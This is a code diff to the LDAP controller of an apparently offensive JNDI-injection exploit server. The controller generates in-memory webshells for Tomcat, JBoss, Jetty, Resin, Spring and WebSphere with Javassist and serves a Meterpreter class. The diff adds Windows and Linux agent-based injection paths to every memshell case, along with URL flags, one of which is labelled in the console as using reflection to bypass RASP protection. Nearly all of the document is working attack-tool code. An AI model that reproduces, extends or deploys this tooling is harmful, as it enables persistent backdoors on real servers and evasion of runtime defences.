@@ -26,20 +26,20 @@ import com.unboundid.ldap.sdk.ResultCode;
 import javassist.*;
 import org.apache.commons.codec.binary.Base64;
 
+import java.lang.reflect.InvocationTargetException;
 import java.net.URL;
 
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
-import static com.nu1r.jndi.utils.Config.URL_PATTERN;
-import static com.nu1r.jndi.utils.Config.Shell_Type;
-import static com.nu1r.jndi.utils.Config.IS_OBSCURE;
+import static com.nu1r.jndi.gadgets.utils.InjShell.*;
+import static com.nu1r.jndi.utils.Config.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
     //最后的反斜杠不能少
-    private final String      codebase = Config.codeBase;
-    private       PayloadType payloadType;
-    private       String[]    params;
+    private final  String      codebase = Config.codeBase;
+    private static PayloadType payloadType;
+    private        String[]    params;
     private       GadgetType  gadgetType;
 
     @Override
@@ -73,74 +73,146 @@ public class BasicController implements LdapController {
                 className = SpringEchoTemplate.class.getName();
                 break;
             case tomcatfilterjmx:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TFMSFromJMXF.class));
                 ctClass = pool.get(TFMSFromJMXF.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case tomcatfilterth:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TFMSFromThreadF.class));
                 ctClass = pool.get(TFMSFromThreadF.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case tomcatlistenerjmx:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TLMSFromJMXLi.class));
                 ctClass = pool.get(TLMSFromJMXLi.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case tomcatlistenerth:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TLMSFromThreadLi.class));
                 ctClass = pool.get(TLMSFromThreadLi.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case tomcatservletjmx:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TSMSFromJMXS.class));
                 ctClass = pool.get(TSMSFromJMXS.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case tomcatservletth:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TSMSFromThreadS.class));
                 ctClass = pool.get(TSMSFromThreadS.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case jbossfilter:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(JBFMSFromContextF.class));
                 ctClass = pool.get(JBFMSFromContextF.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case jbossservlet:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(JBSMSFromContextS.class));
                 ctClass = pool.get(JBSMSFromContextS.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
@@ -148,6 +220,7 @@ public class BasicController implements LdapController {
                 className = WebsphereMemshellTemplate.class.getName();
                 break;
             case springinterceptor:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(SpringInterceptorMS.class));
                 ctClass = pool.get(SpringInterceptorMS.class.getName());
@@ -165,6 +238,14 @@ public class BasicController implements LdapController {
                 String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                 ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                 ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
@@ -172,56 +253,110 @@ public class BasicController implements LdapController {
                 className = isSuccess.class.getName();
                 break;
             case jettyfilter:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(JFMSFromJMXF.class));
                 ctClass = pool.get(JFMSFromJMXF.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case jettyservlet:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(JSMSFromJMXS.class));
                 ctClass = pool.get(JSMSFromJMXS.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case wsfilter:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(WSFMSFromThread.class));
                 ctClass = pool.get(WSFMSFromThread.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "ws");
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case tomcatexecutor:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TWSMSFromThread.class));
                 ctClass = pool.get(TWSMSFromThread.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "execute");
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case resinfilterth:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(RFMSFromThreadF.class));
                 ctClass = pool.get(RFMSFromThreadF.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
             case resinservletth:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(RSMSFromThreadS.class));
                 ctClass = pool.get(RSMSFromThreadS.class.getName());
                 InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
@@ -229,11 +364,20 @@ public class BasicController implements LdapController {
                 className = Meterpreter.class.getName();
                 break;
             case tomcatupgrade:
+                Config.init();
                 pool = ClassPool.getDefault();
                 pool.insertClassPath(new ClassClassPath(TUGMSFromJMXuP.class));
                 ctClass = pool.get(TUGMSFromJMXuP.class.getName());
-                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, Shell_Type);
+                InjShell.class.getMethod("insertKeyMethod", CtClass.class, String.class).invoke(InjShell.class.newInstance(), ctClass, "upgrade");
                 ctClass.setName(generateClassName());
+                if (winAgent){
+                    className = insertWinAgent(ctClass);
+                    break;
+                }
+                if (linAgent){
+                    className = insertLinAgent(ctClass);
+                    break;
+                }
                 className = ctClass.getName();
                 ctClass.writeFile();
                 break;
@@ -271,7 +415,6 @@ public class BasicController implements LdapController {
                 if (thirdIndex < 0) thirdIndex = base.length();
                 try {
                     gadgetType = gadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
-                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Payload >> |@" + gadgetType));
                 } catch (IllegalArgumentException e) {
                     throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + base.substring(secondIndex + 1, thirdIndex));
                 }
@@ -291,9 +434,17 @@ public class BasicController implements LdapController {
                         Shell_Type = U[1];
                         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA ShellType >> |@" + U[1]));
                     }
-                    if (i >= 3) {
+                    if (url1.contains("obscure")) {
                         IS_OBSCURE = true;
-                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP >> |@" + U[2]));
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 使用反射绕过RASP |@" ));
+                    }
+                    if (url1.contains("winAgent")) {
+                        winAgent = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Windows下使用Agent写入 |@"));
+                    }
+                    if (url1.contains("linAgent")) {
+                        linAgent = true;
+                        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Linux下使用Agent写入 |@"));
                     }
                 } else {
                     URL_PATTERN = url1;
